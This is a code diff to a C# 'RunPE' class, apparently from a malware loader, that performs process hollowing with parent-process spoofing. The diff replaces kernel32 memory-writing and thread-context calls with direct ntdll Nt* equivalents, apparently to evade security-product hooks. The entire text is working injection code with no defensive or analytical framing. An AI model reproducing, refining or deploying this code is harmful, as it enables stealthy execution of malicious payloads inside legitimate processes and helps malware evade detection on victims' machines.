@@ -47,7 +47,7 @@ public static class RunPE
 					attributeList == IntPtr.Zero ||
 					!UpdateProcThreadAttribute(attributeList, 0, (IntPtr)0x20000, parentProcessHandlePtr, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero)) throw new Exception();
 
-				// Use STARTUPINFOEX to implement process spoofing
+				// Use STARTUPINFOEX to implement parent process spoofing
 				int startupInfoLength = IntPtr.Size == 4 ? 0x48 : 0x70;
 				IntPtr startupInfo = Allocate(startupInfoLength);
 				Marshal.Copy(new byte[startupInfoLength], 0, startupInfo, startupInfoLength);
@@ -63,10 +63,11 @@ public static class RunPE
 				processId = BitConverter.ToInt32(processInfo, IntPtr.Size * 2);
 				IntPtr process = IntPtr.Size == 4 ? (IntPtr)BitConverter.ToInt32(processInfo, 0) : (IntPtr)BitConverter.ToInt64(processInfo, 0);
 
-				ZwUnmapViewOfSection(process, imageBase);
+				NtUnmapViewOfSection(process, imageBase);
 
-				if (VirtualAllocEx(process, imageBase, (IntPtr)sizeOfImage, 0x3000, 0x40) == IntPtr.Zero ||
-					WriteProcessMemory(process, imageBase, payload, sizeOfHeaders, IntPtr.Zero) == IntPtr.Zero) throw new Exception();
+				IntPtr sizeOfImagePtr = (IntPtr)sizeOfImage;
+				if (NtAllocateVirtualMemory(process, ref imageBase, IntPtr.Zero, ref sizeOfImagePtr, 0x3000, 0x40) < 0 ||
+					NtWriteVirtualMemory(process, imageBase, payload, sizeOfHeaders, IntPtr.Zero) < 0) throw new Exception();
 
 				for (short j = 0; j < numberOfSections; j++)
 				{
@@ -80,27 +81,27 @@ public static class RunPE
 					byte[] rawData = new byte[sizeOfRawData];
 					Buffer.BlockCopy(payload, pointerToRawData, rawData, 0, rawData.Length);
 
-					if (WriteProcessMemory(process, (IntPtr)((long)imageBase + virtualAddress), rawData, rawData.Length, IntPtr.Zero) == IntPtr.Zero) throw new Exception();
+					if (NtWriteVirtualMemory(process, (IntPtr)((long)imageBase + virtualAddress), rawData, rawData.Length, IntPtr.Zero) < 0) throw new Exception();
 				}
 
 				IntPtr thread = IntPtr.Size == 4 ? (IntPtr)BitConverter.ToInt32(processInfo, 4) : (IntPtr)BitConverter.ToInt64(processInfo, 8);
-				if (!GetThreadContext(thread, context)) throw new Exception();
+				if (NtGetContextThread(thread, context) < 0) throw new Exception();
 
 				if (IntPtr.Size == 4)
 				{
 					IntPtr ebx = (IntPtr)Marshal.ReadInt32(context, 0xa4);
-					if (WriteProcessMemory(process, (IntPtr)((int)ebx + 8), BitConverter.GetBytes((int)imageBase), 4, IntPtr.Zero) == IntPtr.Zero) throw new Exception();
+					if (NtWriteVirtualMemory(process, (IntPtr)((int)ebx + 8), BitConverter.GetBytes((int)imageBase), 4, IntPtr.Zero) < 0) throw new Exception();
 					Marshal.WriteInt32(context, 0xb0, (int)imageBase + entryPoint);
 				}
 				else
 				{
 					IntPtr rdx = (IntPtr)Marshal.ReadInt64(context, 0x88);
-					if (WriteProcessMemory(process, (IntPtr)((long)rdx + 16), BitConverter.GetBytes((long)imageBase), 8, IntPtr.Zero) == IntPtr.Zero) throw new Exception();
+					if (NtWriteVirtualMemory(process, (IntPtr)((long)rdx + 16), BitConverter.GetBytes((long)imageBase), 8, IntPtr.Zero) < 0) throw new Exception();
 					Marshal.WriteInt64(context, 0x80, (long)imageBase + entryPoint);
 				}
 
-				if (!SetThreadContext(thread, context)) throw new Exception();
-				if (ResumeThread(thread) == -1) throw new Exception();
+				if (NtSetContextThread(thread, context) < 0) throw new Exception();
+				if (NtResumeThread(thread, out _) == -1) throw new Exception();
 			}
 			catch
 			{
@@ -132,18 +133,18 @@ public static class RunPE
 	private static extern IntPtr OpenProcess(int access, bool inheritHandle, int processId);
 	[DllImport("kernel32.dll")]
 	private static extern bool CreateProcess(string applicationName, string commandLine, IntPtr processAttributes, IntPtr threadAttributes, bool inheritHandles, uint creationFlags, IntPtr environment, string currentDirectory, IntPtr startupInfo, byte[] processInformation);
-	[DllImport("kernel32.dll")]
-	private static extern IntPtr VirtualAllocEx(IntPtr process, IntPtr address, IntPtr size, uint allocationType, uint protect);
-	[DllImport("kernel32.dll")]
-	private static extern IntPtr WriteProcessMemory(IntPtr process, IntPtr baseAddress, byte[] buffer, int size, IntPtr bytesWritten);
+	[DllImport("ntdll.dll", SetLastError = true)]
+	private static extern int NtAllocateVirtualMemory(IntPtr process, ref IntPtr address, IntPtr zeroBits, ref IntPtr size, uint allocationType, uint protect);
 	[DllImport("ntdll.dll")]
-	private static extern uint ZwUnmapViewOfSection(IntPtr process, IntPtr baseAddress);
-	[DllImport("kernel32.dll")]
-	private static extern bool SetThreadContext(IntPtr thread, IntPtr context);
-	[DllImport("kernel32.dll")]
-	private static extern bool GetThreadContext(IntPtr thread, IntPtr context);
-	[DllImport("kernel32.dll")]
-	private static extern int ResumeThread(IntPtr thread);
+	private static extern int NtWriteVirtualMemory(IntPtr process, IntPtr baseAddress, byte[] buffer, int size, IntPtr bytesWritten);
+	[DllImport("ntdll.dll")]
+	private static extern uint NtUnmapViewOfSection(IntPtr process, IntPtr baseAddress);
+	[DllImport("ntdll.dll")]
+	private static extern int NtSetContextThread(IntPtr thread, IntPtr context);
+	[DllImport("ntdll.dll")]
+	private static extern int NtGetContextThread(IntPtr thread, IntPtr context);
+	[DllImport("ntdll.dll")]
+	private static extern int NtResumeThread(IntPtr thread, out uint suspendCount);
 	[DllImport("kernel32.dll", SetLastError = true)]
 	[return: MarshalAs(UnmanagedType.Bool)]
 	private static extern bool InitializeProcThreadAttributeList(IntPtr attributeList, int attributeCount, int flags, ref IntPtr size);
